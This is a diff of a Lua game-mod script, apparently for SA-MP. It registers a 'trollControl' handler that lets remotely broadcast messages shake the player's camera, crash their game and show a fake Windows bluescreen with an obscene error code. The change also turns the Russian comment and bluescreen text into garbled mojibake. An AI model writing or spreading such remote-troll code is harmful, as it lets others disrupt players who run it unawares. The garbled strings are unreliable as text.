@@ -19,6 +19,7 @@ function main()
     broadcaster.registerHandler('trollControl', myHandler)
     while true do
         wait(0)
+        print('+')
         _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
         nick = sampGetPlayerNickname(id)
         wait(1500)
@@ -77,7 +78,7 @@ function myHandler(message) --send
     elseif message:find('commandShakeCamera') then
         shakeCam(10000) 
     elseif message:find('commandCrashGame') then
-        setPlayerControl(PLAYER_PED, false) --хотел сделать фриз, в итоге вышел краш, ну похуй
+        setPlayerControl(PLAYER_PED, false) --ГµГ®ГІГҐГ« Г±Г¤ГҐГ«Г ГІГј ГґГ°ГЁГ§, Гў ГЁГІГ®ГЈГҐ ГўГ»ГёГҐГ« ГЄГ°Г Гё, Г­Гі ГЇГ®ГµГіГ©
     end
 end
 
@@ -85,8 +86,8 @@ function onD3DPresent()
     if bluescreen then
         local copywrite = {
             [4] = ':(',
-            [5] = 'На вашем ПК возникла проблема, и его необходимо \nперезагрузить. Мы лишь собираем некоторые сведения об \nошибке, а затем будет автоматическая \nперезагрузка (выполнено 100%)',
-            [6] = 'При желании вы можете найти в Интернете информация по этому коду ошибки: MAT_EBAL'
+            [5] = 'ГЌГ  ГўГ ГёГҐГ¬ ГЏГЉ ГўГ®Г§Г­ГЁГЄГ«Г  ГЇГ°Г®ГЎГ«ГҐГ¬Г , ГЁ ГҐГЈГ® Г­ГҐГ®ГЎГµГ®Г¤ГЁГ¬Г® \nГЇГҐГ°ГҐГ§Г ГЈГ°ГіГ§ГЁГІГј. ГЊГ» Г«ГЁГёГј Г±Г®ГЎГЁГ°Г ГҐГ¬ Г­ГҐГЄГ®ГІГ®Г°Г»ГҐ Г±ГўГҐГ¤ГҐГ­ГЁГї Г®ГЎ \nГ®ГёГЁГЎГЄГҐ, Г  Г§Г ГІГҐГ¬ ГЎГіГ¤ГҐГІ Г ГўГІГ®Г¬Г ГІГЁГ·ГҐГ±ГЄГ Гї \nГЇГҐГ°ГҐГ§Г ГЈГ°ГіГ§ГЄГ  (ГўГ»ГЇГ®Г«Г­ГҐГ­Г® 100%)',
+            [6] = 'ГЏГ°ГЁ Г¦ГҐГ«Г Г­ГЁГЁ ГўГ» Г¬Г®Г¦ГҐГІГҐ Г­Г Г©ГІГЁ Гў Г€Г­ГІГҐГ°Г­ГҐГІГҐ ГЁГ­ГґГ®Г°Г¬Г Г¶ГЁГї ГЇГ® ГЅГІГ®Г¬Гі ГЄГ®Г¤Гі Г®ГёГЁГЎГЄГЁ: MAT_EBAL'
         }
         lua_thread.create(function() 
             while true do
